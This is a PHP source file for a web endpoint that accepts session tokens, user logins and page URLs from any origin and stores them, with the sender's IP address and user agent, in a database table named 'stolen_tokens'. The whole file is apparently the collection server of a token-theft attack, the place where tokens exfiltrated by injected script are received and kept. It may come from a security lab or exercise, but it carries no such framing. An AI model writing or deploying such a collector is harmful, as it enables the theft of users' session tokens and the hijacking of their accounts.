<?php
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');
header('Content-Type: application/json; charset=utf-8');

$mysqli = new mysqli('127.0.0.1', 'root', '', 'security');

if ($mysqli->connect_error) {
    http_response_code(500);
    echo json_encode([
        'status' => 'error', 
        'message' => 'Database connection failed: ' . $mysqli->connect_error
    ]);
    exit;
}

$mysqli->set_charset("utf8");

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    exit(0);
}

function getClientIP() {
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    } elseif (!empty($_SERVER['HTTP_X_REAL_IP'])) {
        return $_SERVER['HTTP_X_REAL_IP'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

try {
    $token = '';
    $user_login = '';
    $page_url = '';
    
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $input = file_get_contents('php://input');
        
        if (!empty($input)) {
            $data = json_decode($input, true);
            if (json_last_error() === JSON_ERROR_NONE) {
                $token = $data['token'] ?? '';
                $user_login = $data['user_login'] ?? '';
                $page_url = $data['page_url'] ?? '';
            }
        }
    } else {
        $token = $_GET['token'] ?? '';
        $user_login = $_GET['user_login'] ?? '';
        $page_url = $_GET['page_url'] ?? '';
    }
    
    $ip_address = getClientIP();
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    
    if (empty($page_url)) {
        $page_url = $_SERVER['HTTP_REFERER'] ?? '';
    }
    
    if (!empty($token)) {
        $stmt = $mysqli->prepare("INSERT INTO stolen_tokens (token, user_login, ip_address, user_agent, page_url) VALUES (?, ?, ?, ?, ?)");
        
        if ($stmt) {
            $stmt->bind_param("sssss", $token, $user_login, $ip_address, $user_agent, $page_url);
            
            if ($stmt->execute()) {
                echo json_encode([
                    'status' => 'success', 
                    'message' => 'Token successfully saved to database',
                    'id' => $stmt->insert_id
                ]);
            } else {
                throw new Exception('Failed to execute query: ' . $stmt->error);
            }
            
            $stmt->close();
        } else {
            throw new Exception('Failed to prepare statement: ' . $mysqli->error);
        }
    } else {
        echo json_encode([
            'status' => 'error',
            'message' => 'No token provided'
        ]);
    }
    
} catch (Exception $e) {
    http_response_code(500);
    echo json_encode([
        'status' => 'error',
        'message' => 'Server error: ' . $e->getMessage()
    ]);
}

$mysqli->close();
?>